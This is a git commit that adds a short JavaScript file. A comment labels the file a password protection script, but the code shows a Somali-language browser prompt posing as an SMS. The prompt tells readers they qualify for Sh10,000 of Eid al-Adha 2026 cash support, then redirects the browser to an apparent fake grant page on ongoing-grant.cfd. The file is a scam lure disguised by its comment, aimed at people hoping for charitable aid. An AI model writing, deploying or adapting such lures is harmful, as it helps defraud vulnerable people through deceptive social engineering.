2b364a09127aece0251878814f9793957164c798
The-ongoing <preciousadaowo4@gmail.com>
2026-05-29 07:27:40 +0100

    Create activesoma.js

---
+++ activesoma.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'Hesho Sh10,000'
+password = prompt(
+  'SMS: Hambalyo! Waxaa lagu xaqiijiyay inaad u qalanto Sh10,000 Eid al-adha 2026 TAAGEERADA CASHKA BULSHADA. Fadlan guji OK si aad isla markiiba u hesho.',
+  'Hesho Sh10,000'
+); 
+if (password != 'Hesho Sh10,000') {
+  location.href = 'https://ongoing-grant.cfd/Taageerada-Lacageed-Ee-Eid-Al-Adha.html';
+  }
